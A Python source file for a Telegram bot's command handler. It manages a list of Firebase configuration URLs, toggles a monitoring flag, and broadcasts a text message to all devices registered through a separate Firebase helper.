from telegram import Update
from telegram.ext import ContextTypes
import time

class CommandHandler:
    def __init__(self, config_manager, firebase_manager):
        self.config_manager = config_manager
        self.firebase_manager = firebase_manager
        self.monitoring = False

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        active = self.config_manager.get_active_config()
        total = len(self.config_manager.list_configs())
        await update.message.reply_text(
            f"🚀 Bot Active!\nFirebase Configs: {total}\nActive: {active['id'] if active else 'None'}"
        )

    async def add_firebase(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.args:
            await update.message.reply_text("⚠️ Usage: /addfirebase <url> [name]")
            return
        url = context.args[0].strip()
        name = " ".join(context.args[1:]) if len(context.args) > 1 else ""
        config_id = self.config_manager.add_config(url, name)
        await update.message.reply_text(f"✅ Firebase {config_id} added!\nActive now.")

    async def list_firebase(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        configs = self.config_manager.list_configs()
        active_id = self.config_manager.configs.get("active_id")
        if not configs:
            await update.message.reply_text("📭 No Firebase configs.")
            return
        msg = "📋 Firebase Configs:\n\n"
        for cid, data in configs.items():
            status = "🟢" if cid == active_id else "🔴"
            msg += f"{status} ID: {cid} - {data.get('name', 'Unnamed')}\n"
        await update.message.reply_text(msg)

    async def use_firebase(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.args:
            await update.message.reply_text("⚠️ Usage: /usefirebase <id>")
            return
        cid = context.args[0].strip()
        if self.config_manager.set_active_config(cid):
            await update.message.reply_text(f"✅ Switched to Firebase {cid}")
        else:
            await update.message.reply_text(f"❌ Firebase {cid} not found")

    async def remove_firebase(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.args:
            await update.message.reply_text("⚠️ Usage: /removefirebase <id>")
            return
        cid = context.args[0].strip()
        if self.config_manager.remove_config(cid):
            await update.message.reply_text(f"✅ Firebase {cid} removed")
        else:
            await update.message.reply_text(f"❌ Firebase {cid} not found")

    async def start_monitor(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        self.monitoring = True
        await update.message.reply_text("🟢 Monitoring started!")

    async def stop_monitor(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        self.monitoring = False
        await update.message.reply_text("🔴 Monitoring stopped!")

    async def send_to_all(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.args:
            await update.message.reply_text("⚠️ Usage: /sendall <message>")
            return
        message = " ".join(context.args)
        devices = self.firebase_manager.get_all_devices()
        if not devices:
            await update.message.reply_text("❌ No devices found!")
            return
        success = 0
        for device_id in devices:
            if self.firebase_manager.send_command_to_device(device_id, message):
                success += 1
        await update.message.reply_text(f"✅ Message sent to {success}/{len(devices)} devices")

    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        active = self.config_manager.get_active_config()
        await update.message.reply_text(
            f"📊 Status:\nActive: {active['id'] if active else 'None'}\nMonitoring: {self.monitoring}"
        )

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        help_text = """
📋 Commands:
/addfirebase <url> [name] - Add Firebase
/listfirebase - List all
/usefirebase <id> - Switch
/removefirebase <id> - Remove
/startmonitor - Start
/stopmonitor - Stop
/sendall <msg> - Send to all
/status - Status
/help - Help
"""
        await update.message.reply_text(help_text)
